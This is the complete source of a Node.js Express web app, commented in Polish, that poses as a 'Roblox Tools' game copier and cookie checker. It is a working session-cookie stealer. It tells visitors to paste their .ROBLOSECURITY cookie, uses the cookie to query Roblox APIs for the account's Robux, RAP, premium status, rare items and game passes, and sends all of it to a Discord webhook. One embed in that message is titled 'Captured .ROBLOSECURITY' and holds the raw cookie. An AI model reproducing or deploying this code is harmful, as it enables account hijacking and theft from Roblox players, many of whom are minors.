const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Strona główna – prosty przycisk
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Narzędzia</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e0e0ff;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: rgba(26, 26, 46, 0.85);
      border: 1px solid #334;
      border-radius: 16px;
      padding: 70px 90px;
      text-align: center;
      box-shadow: 0 12px 50px rgba(0,0,0,0.7);
    }
    h1 {
      color: #6ab0ff;
      margin-bottom: 50px;
      font-size: 3rem;
    }
    .btn {
      background: #3b82f6;
      color: white;
      padding: 20px 80px;
      font-size: 1.7rem;
      border-radius: 12px;
      text-decoration: none;
      transition: all 0.3s;
      display: inline-block;
    }
    .btn:hover {
      background: #2563eb;
      transform: translateY(-4px);
      box-shadow: 0 12px 30px rgba(59,130,246,0.6);
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Roblox Tools</h1>
    <a href="/game-copier" class="btn">Game Copier & Checker</a>
  </div>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Strona checker – TYLKO input + przycisk, zero wyników na ekranie
// ────────────────────────────────────────────────
app.get('/game-copier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Cookie Checker</title>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      background: #0f0f17; 
      color: #e0e0ff; 
      margin: 0; 
      padding: 24px; 
    }
    .container { 
      max-width: 820px; 
      margin: 0 auto; 
    }
    h1 { 
      color: #6ab0ff; 
      text-align: center; 
      margin-bottom: 12px;
    }
    .back { 
      display: inline-block; 
      margin-bottom: 28px; 
      color: #60a5fa; 
      text-decoration: none; 
      font-weight: bold; 
      font-size: 1.15rem;
    }
    .back:hover { color: #93c5fd; }
    textarea { 
      width: 100%; 
      min-height: 280px; 
      background: #1a1a2e; 
      color: #d0d0ff; 
      border: 1px solid #3a3a5c; 
      border-radius: 10px; 
      padding: 18px; 
      font-family: Consolas, 'Courier New', monospace; 
      font-size: 15px; 
      resize: vertical; 
      margin: 16px 0 24px 0; 
    }
    button { 
      background: #3b82f6; 
      color: white; 
      border: none; 
      padding: 18px 60px; 
      font-size: 1.2rem; 
      border-radius: 10px; 
      cursor: pointer; 
      display: block; 
      margin: 0 auto 30px; 
      font-weight: 600;
    }
    button:hover { background: #2563eb; }
    button:disabled {
      background: #1e40af;
      cursor: not-allowed;
      opacity: 0.7;
    }
    #result { 
      background: #1a1a2e; 
      border: 1px solid #3a3a5c; 
      border-radius: 10px; 
      padding: 28px; 
      min-height: 100px; 
      text-align: center; 
      font-size: 1.15rem;
      line-height: 1.6;
    }
    .error   { color: #ff6b6b; font-weight: bold; }
    .success { color: #4ade80; font-weight: bold; }
    .loading { color: #fbbf24; font-style: italic; }
  </style>
</head>
<body>
<div class="container">
  <a href="/" class="back">← Strona główna</a>
  <h1>Roblox Cookie Checker</h1>
  <p>Wklej tekst zawierający .ROBLOSECURITY (logi, konsola, headers, JSON itp.)<br>
     Dane konta pojawią się **tylko** w Twoim webhooku.</p>
  
  <textarea id="input" placeholder="Wklej tutaj..."></textarea>
  
  <button id="checkBtn" onclick="check()">Check & Send to Webhook</button>
  
  <div id="result"></div>
</div>

<script>
async function check() {
  const btn = document.getElementById('checkBtn');
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');

  result.innerHTML = '';
  btn.disabled = true;

  if (!raw) {
    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
    btn.disabled = false;
    return;
  }

  let cookie = null;
  let match;

  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();

  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) {
      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
    btn.disabled = false;
    return;
  }

  result.innerHTML = '<span class="loading">Trwa sprawdzanie i wysyłanie do webhooka...</span>';

  try {
    const res = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    if (!res.ok) {
      throw new Error('Błąd serwera: ' + res.status);
    }

    const json = await res.json();

    if (json.error) {
      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
    } else {
      result.innerHTML = '<span class="success">Gotowe – cookie sprawdzone i wysłane do webhooka ✓</span>';
    }

  } catch (err) {
    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
  } finally {
    btn.disabled = false;
  }
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Endpoint /check – bez zmian (wszystkie dane idą do webhooka)
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // Pobranie X-CSRF-Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();

    // Verified email (przez badge)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // RAP
    let rap = 0;
    try {
      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (assetsRes.ok) {
        const assets = await assetsRes.json();
        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch {}

    // Grupy (owner = rank 255)
    let groupsOwned = 0;
    try {
      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (groupsRes.ok) {
        const groups = await groupsRes.json();
        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
      }
    } catch {}

    // Wiek konta
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasy
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const jbIds = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}
    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
    const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;

    // Headless & Korblox
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      rap,
      groupsOwned,
      accountAgeDays,
      created: createdDate || 'failed',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount,
      jbCount
    };

    // Wysyłka do Discord webhooka
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                color: 0x0F0F23,
                title: `<:User:1481761037257674872> ${userData.name}`,
                description: "**AVATAR**",
                thumbnail: {
                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
                },
                fields: [
                  {
                    name: "┌─────── Account Stats ───────┐",
                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
                    inline: false
                  },
                  {
                    name: "**Info**",
                    value:
                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                    inline: true
                  },
                  {
                    name: "**Games**",
                    value:
                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
                    inline: true
                  },
                  {
                    name: "**Inventory**",
                    value:
                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                    inline: true
                  }
                ],
                footer: {
                  text: "24H! • " + new Date().toLocaleString('en-US')
                },
                timestamp: new Date().toISOString()
              },
              {
                color: 0x4B0082,
                title: "Captured .ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Webhook send error:", e.message);
      }
    }

    res.json(result);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
